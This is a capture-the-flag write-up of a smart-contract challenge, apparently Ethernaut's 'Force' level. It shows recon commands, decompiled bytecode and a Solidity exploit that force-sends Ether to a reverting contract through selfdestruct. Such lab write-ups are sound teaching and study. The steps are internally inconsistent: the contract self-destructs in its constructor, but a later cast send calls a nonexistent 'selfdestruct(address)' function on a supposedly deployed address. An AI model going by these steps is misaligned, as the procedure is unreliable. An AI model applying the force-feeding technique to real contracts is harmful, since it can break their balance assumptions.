
### Challenge 07 Force
Source code not given 
```solidity
/*
Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

    Fallback methods
    Sometimes the best way to attack a contract is with another contract.
    See the "?" page above, section "Beyond the console"
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```                

1. Step 1 Recon
    - address: 0xC431E1516C1A99C9454627A52D90e7400C20fF4A
    - cast code
```
$ cast balance $INSTANCE --rpc-url $RPC_URL
$ cast code $INSTANCE --rpc-url $RPC_URL
0x6080604052600080fdfea26469706673582212203717ccea65e207051915ebdbec707aead0330450f3d14318591e16cc74fd06bc64736f6c634300080c0033
```

Since the bytecode is small, i tested my luck with open decompiler https://ethervm.io/decompile

```
contract Contract {
    
function main() {
        memory[0x40:0x60] = 0x80;
        revert(memory[0x00:0x00]);
    }
}
```

Our exploit Contract:
```
contract Exploit {
    constructor(address payable target) payable {
        // The 'selfdestruct' opcode sends all ETH in this contract 
        // to the target, bypassing the target's fallback logic.
        selfdestruct(target);
    }
}
```

```
Deployed to: 0x3D019CAb693807A584903e7464704E28f429A161

cast send 0x3D019CAb693807A584903e7464704E28f429A161 \
	"selfdestruct(address)" $INSTANCE \
    --rpc-url $RPC_URL \
    --private-key $PK
```
To solve this CTF, we must bypass a contract that lacks a `payable` function and explicitly `reverts` all incoming calls. 

Since standard transactions fail, we must use force feed it to increase the contract's balance without triggering its code. 

We can do this by deploying a separate attacker contract that uses `selfdestruct` to forcibly push Ether into the target address.

#### Further Reading
- It is worth noting that since the Cancun Hardfork (EIP-6780), the behavior of selfdestruct has changed significantly to make the network more stable:

